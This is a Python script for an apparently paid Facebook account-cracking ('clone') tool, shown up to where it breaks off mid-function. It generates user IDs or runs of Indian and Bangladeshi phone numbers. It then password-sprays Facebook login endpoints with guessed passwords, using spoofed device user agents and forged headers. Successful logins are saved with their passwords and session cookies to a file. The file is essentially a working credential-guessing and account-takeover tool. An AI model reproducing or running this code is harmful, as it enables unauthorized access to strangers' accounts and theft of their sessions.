import base64
import os
import random
import re
import string
import sys
import time
import uuid
from io import BytesIO

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"


# get system data


class sort:
    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''    //   ) )                                      
   //___/ /  __     ( )   __      ___      ___    
  / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
 //       //      / / //   / / //       //        
//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Paid[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


ua = []


def live_update():
    try:
        url = "https://github.com/Shadid21/Fuck-Clone/blob/main/database"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax = buffer.getvalue().decode('utf-8').splitlines()[0]
        for u in datax.split("|"):
            ua.append(u)
    except:
        sys.exit("[!!] Internet Error...")


live_update()


def info():
    sort.clear()
    print('[b][red1]WELCOME TO MY TOOL          ')
    time.sleep(3)
    if not os.path.exists('device_info.txt'):
        os.system('clear')
        print(sort.logo())
        print(" What is your android version ex 8,9,10")
        version_ = input(' Type android version : ')
        print(44 * '-')
        print(" Your mobile model ex Techno LD7 or Oppo CPH2095 etc")
        model_ = input(" Model name : ")
        print(44 * "-")
        print(" Your mobile company name ex Techno,Redmi")
        brand_name_ = input(" Device company name : ")
        print(44 * '-')
        print(" Your mobile width ex 720,740,730,780 etc")
        width_ = input(" Device width : ")
        print(44 * '-')
        print(" Your mobile height ex 1660,1780,1730 etc")
        height_ = input(" Device height: ")
        info_file = open("device_info.txt", "a").write(
            version_ + '$' + model_ + '$' + brand_name_ + '$' + width_ + '$' + height_)
    time.sleep(4)
    sort.clear()
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
    # os.system("xdg-open https://www.facebook.com/HeronAfridi.Official");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
    # os.system("xdg-open https://m.me/j/AbYhZTf4PCEUXDNP/");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN CHANNEL ... ")
    # os.system("xdg-open https://t.me/TeamElite_Channel");time.sleep(2)


# ---------# Global
oks = []
loop = 0
sys_ua = []


def cont(li):
    if li < 10:
        return "0" + str(li)
    else:
        return str(li)


# ---------# Date
month = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July",
         "08": "August", "09": "September", "10": "October", "11": "November", "12": "December", }
today_data = str(datetime.now()).split(" ")[0].split("-")
today = today_data[2] + "\x1b[1;97m." + month.get(today_data[1])


# ---------#Old Date
def ua():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx


# "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"

# Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]

# Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]


for brand in range(1000):
    a = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    b = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    c = str(random.randint(1, 9))
    d = str(random.randint(10, 20))
    abc = a + b + c
    if not os.path.exists('device_info.txt'):
        info()
    else:
        infos = open('device_info.txt', 'r').read()
        version_, model_, brand_name_, width_, height_ = infos.split('$')
        uaaa = "Dalvik/2.1.0 (Linux; U; Android " + version_ + "; " + model_ + " Build/" + abc + "A." + str(
            random.randint(190000, 199999)) + ".0" + d + ") [FBAN/Orca-Android;FBAV/" + str(
            random.randint(200, 350)) + "." + str(random.randint(0, 1)) + ".0." + str(
            random.randint(20, 70)) + "." + str(
            random.randint(110, 280)) + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + str(random.randint(390000000,
                                                                                                        399999999)) + ";FBCR/MTN;FBMF/" + brand_name_ + ";FBBD/" + brand_name_ + ";FBDV/""" + model_ + ";FBSV/" + version_ + ";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=" + width_ + ",height=" + height_ + "};FB_FW/1;]"
        sys_ua.append(uaaa)


def Samsung():
    Anderson = random.choice(
        ["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1",
         "6.0.1", "9.0.1"])
    model = random.choice(
        ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
         "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F",
         "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android " + Anderson + "; " + model + " Build/LRX22C) [FBAN/" + FBAN + ";FBAV/" + cho + ".0.0.15.89;FBPN/" + platform + ";FBLC/sv_SE;FBBV/" + vir + ";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/" + model + ";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=" + str(
        random.choice(range(1, 4))) + ".0,width=" + str(random.choice(range(720, 1500))) + ",height=" + str(
        random.choice(range(1500, 2000))) + "};FB_FW/1;]"
    return ua


def dd(fbbd, device):
    if fbbd.lower() == "samsung":
        return random.choice(
            ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
             "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F",
             "SM-J210F", "SM-N9005", "SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935", "V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(
            ['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G',
             'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s',
             'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
    elif fbbd.lower() == "oppo":
        return random.choice(["CPH" + str(random.choice(range(1000, 2000))), "oppo r7sm"])
    elif fbbd.lower() == "oneplus":
        return random.choice(["A0001", "OnePlus 11R", "OnePlus 10T", "OnePlus Nord 3 5G"])
    elif fbbd.lower() == "google":
        return random.choice(["Pixel 6a", "Pixel 3"])
    elif fbbd.lower() == "asus":
        return random.choice(["ASUS_X01BDA", "ASUS_Z01QD", "ASUS_I005DC", "NX55", "MXB48T"])
    elif fbbd.lower() == "huawei":
        return random.choice(
            ["DUB-LX1", "AGS2-L09", "POT-LX1", "DRA-LX2", "POT-LX3", "VOG-L29", "EVR-N29", "FIG-LX1", "Kirin Treble",
             "HUAWEI LUA-L21", "ATU-L31", "COL-L29", "NAM-LX9", "VOG-L29", "JKM-LX1", "RNE-L22"])
    elif fbbd.lower() == "lenovo":
        return random.choice(
            ["Lenovo TB-X505F", "Lenovo A6020a46", 'PAFR0026IN', 'PAFR0026', 'PAFR0033IN', 'PAFR0033', 'PAFR0013IN',
             'PAFR0013', 'PAGW0015IN', 'L39051', 'XT2091-8'])
    elif fbbd.lower() == "sony":
        return random.choice(
            ["C2105", "C2104", "G3312", "G3311", "G3313", "LT29i", "D6503", "D6502", "SO-03F", "Xperia Z2", "D6503",
             "D6502", "SO-03F", "Xperia Z2", "D6563", "D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646",
             "D5803", "D5833", "SO-02G", "D6633", "D6603", "D6643", "D6653", "D6616", "D6683", "SGP621", "SGP611",
             "E6533", "D6708"])
    elif fbbd.lower() == "tecno":
        return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
    else:
        return device


# -----------#
def Motorola():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # modorola
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/" + fb_v1 + ".0.0.50." + fb_v2 + ";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/" + rdp1 + ";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/" + andv + ".0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"

    return ua


def Vivo():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # vivo
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/" + fb_v1 + ".0.0.16." + fb_v2 + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + rdp1 + ";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/" + andv + ".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"

    return ua


def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


# -----------#
def generate_random_string(lowercase_count, numeric_count):
    lowercase_chars = string.ascii_lowercase
    numeric_chars = string.digits

    lowercase_part = ''.join(random.choices(lowercase_chars, k=lowercase_count))
    numeric_part = ''.join(random.choices(numeric_chars, k=numeric_count))

    return lowercase_part + numeric_part


def shuffle_string(s):
    shuffled_list = list(s)
    random.shuffle(shuffled_list)
    return ''.join(shuffled_list)


lowercase_count = 16
numeric_count = 18

low = 10
num = 22

ran_string = generate_random_string(low, num)
shuffled_cid = shuffle_string(ran_string)

random_string = generate_random_string(lowercase_count, numeric_count)
shuffled_connection_token = shuffle_string(random_string)


def old():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 2011-14 Id")
    print("[b]    [red1][B] [spring_green1]Crack 2009-10 Id")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2011-14")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star = "10000"
        for i in range(limit):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        star = "100000"
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2009-10")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    with ThreadPool(max_workers=40) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())
        for mal in user:
            uid = star + mal
            heron.submit(login, uid, meth)

user_agent="Dalvik/2.1.0 (Linux; U; Android 8.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/483.0.0.16.537;FBPN/com.facebook.orca;FBLC/en_US;FBBV/346852117;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/8.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920)"

def filee():
    global oks, loop
    pwx = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][✗] [chartreuse1][spring_green1]BD/IND FILE Clone")
    print(sort.line())
    print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
          "/sdcard/id.txt")
    path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(sort.line())
    try:
        with open(path, "r") as file:
            fl = file.read().splitlines()
    except Exception as e:
        print("Error:", e)
        filee()
    limit = int(input(" \x1b[38;1;198m  \x1b[38;5;155m   Password Limit -> \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(sort.line())
    for i in range(limit):
        print(
            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if passw not in pwx:
            pwx.append(passw)
        print(sort.line())
    print("  [r dark_olive_green1]N1 -> [/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]N2 -> [/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]N3 -> [/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]N4 -> [/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]N5 -> [/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]N6 -> [/r dark_olive_green1][b violet] Method 6")
    print("  [r dark_olive_green1]N7 -> [/r dark_olive_green1][b violet] Method 7")
    print("  [r dark_olive_green1]N8 -> [/r dark_olive_green1][b violet] Method 8")
    print(sort.line())
    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(sort.line())
    with ThreadPool(max_workers=30) as sub:
        sort.clear()
        print(sort.logo())
        print(
            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
        print(sort.line())
        try:
            for xd in fl:
                uid, name = xd.split("|")
                sub.submit(file_sub, uid, pwx, name, meth, fl)

        except:
            pass
    print("\r\r" + sort.line())
    print(f"  Π! Total OK id : {str(len(oks))}")
    print(f"  Π! Save  /sdcard/PRINCEFILE-OK.txt ")
    print(sort.line())
    sys.exit()


def file_sub(uid, pwx, name, meth, fl):
    global oks, loop
    try:
        if meth in ["a", "A", "1"]:
            uax = ua[0]
        elif meth in ["b", "B", "2"]:
            uax = ua[1]
        elif meth in ["c", "C", "3"]:
            uax = ua[2]
        elif meth in ["d", "D", "4"]:
            uax = ua[3]
        elif meth in ["e", "E", "5"]:
            uax = ua[4]
        elif meth in ["f", "F", "6"]:
            uax = ua[5]
        elif meth in ["g", "G", "7"]:
            uax = ua[6]
        else:
            uax = ua[7]

        sys.stdout.write(
            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}\r\r"),
        sys.stdout.flush()
        First = name.split(" ")[0]
        try:
            Last = name.split(" ")[1]
        except:
            Last = "khan"
        for pw in pwx:
            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
                                                                                          First.upper()).replace(
                "LAST", Last.upper())

            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi = str(uuid.uuid4())
            try:
                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
                device = uax.split("FBDV/")[1].split(";")[0]
                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
                fban = uax.split("FBAN/")[1].split(";")[0]
                fbpn = uax.split("FBPN/")[1].split(";")[0]
                fbav = uax.split("FBAV/")[1].split(";")[0]
                fbbd = uax.split("FBBD/")[1].split(";")[0]
                model = dd(fbbd, device)
                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
                    random.choice(["2", "1", "0"]))
                nowandroidv = uax.split("Android ")[1].split(";")[0]
                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
                    fbav, fbverson).replace(device, model)
            except:
                useragent = uax
                model = uax.split("FBDV/")[1].split(";")[0]
            data = {
                "adid": adi,
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": token,
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': useragent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
                'X-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': f'{shuffled_connection_token}', }
            url = 'https://b-graph.facebook.com/auth/login'
            rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
            if "session_key" in rq:
                coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                oks.append(uid)

                break
            elif "Please Confirm Email" in str(rq):
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                oks.append(uid)

                break
            else:
                continue
    except Exception as e:
        pass
    finally:
        loop += 1


def ran():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]IND Number Clone")
    print("[b]    [red1][B] [spring_green1]BD Number Clone")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
        print(sort.line())
        print(
            "[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    else:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]01710185019")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        # for i in range(limit):
        #     data = str(random.choice(range(1000000, 9999999)))
        #     user.append(data)
        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    print("  [r dark_olive_green1]N1 -> [/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]N2 -> [/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]N3 -> [/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]N4 -> [/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]N5 -> [/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]N6 -> [/r dark_olive_green1][b violet] Method 6 (Best For Robi And Airtel)")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if meth in ["1", "a", "A"]:
        fb = "m"
    elif meth in ["2", "b", "B"]:
        fb = "x"
    elif meth in ["3", "c", "C"]:
        fb = "p"
    elif meth in ["4", "d", "D"]:
        fb = "touch"
    elif meth in ["5", "e", "E"]:
        fb = "free"
    else:
        fb = "mbasic"

    with ThreadPool(max_workers=33) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
        print(sort.line())
        for xd in user:
            if ask in ["1", "01", "a", "A"]:
                uid = "91" + xd
            else:
                uid = "0" + xd
            if ask in ["1", "01", "a", "A"]:
                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
            else:
                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####",
                       "১২৩৪৫৬"]
            heron.submit(ren_sub, uid, pwx, meth, user, fb)


def ren_sub(uid, pwx, meth, user, fb):
    global oks, loop
    shadid = random.choice(sys_ua)
    custom_agent = ""
    session = requests.Session()
    sys.stdout.write(
        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
    sys.stdout.flush()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
            uax = ua()
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                xx = coki.split("c_user=")[1]
                xd = xx[:15]
                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
                try:
                    if "height" in res["data"]:
